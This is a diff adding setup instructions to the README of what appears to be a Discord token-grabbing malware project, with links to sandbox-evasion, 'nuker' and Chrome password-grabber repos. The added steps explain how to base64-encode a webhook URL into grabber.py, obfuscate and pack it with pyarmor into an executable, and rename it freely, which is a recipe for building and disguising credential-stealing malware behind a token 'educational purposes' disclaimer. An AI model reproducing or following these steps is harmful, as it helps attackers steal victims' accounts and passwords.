@@ -15,6 +15,16 @@ Anti-VM was from my [repo](https://github.com/ItsChasa/Bypass-VirusTotal).
 
 If you have anything you'd like to add or just want to talk to people who are similar minded, join my [Discord Server](https://chasa.wtf).
 
+## Setup/Instructions:
+**Please only use this for educational purposes!**
+1. Download Python with PIP, if you already have it then.
+2. Download the repo and do `pip install -r requirements.txt` in cmd (make sure youre in the correct dir).
+3. Go to [base64encode.org](https://www.base64encode.org/) and put your webhook url in, press encode, and copy the long string that appears.
+4. Edit the grabber.py file and on line 39, in the two "", put the string you copied inside the "".
+5. Open cmd in the same dir and type `pyarmor pack -e " --onefile" grabber.py`.
+6. Wait until its done, can take up to 30 seconds.
+7. Open the `dist` folder created and there should be an exe in there. Rename it to whatever you want and you are done! 
+
 ## Check out my other github things:
 * [Discord Nukers and Tools](https://github.com/itschasa/discord-nuker-tools)
 * [Grabber w/ Chrome Passwords](https://github.com/itschasa/grabber)
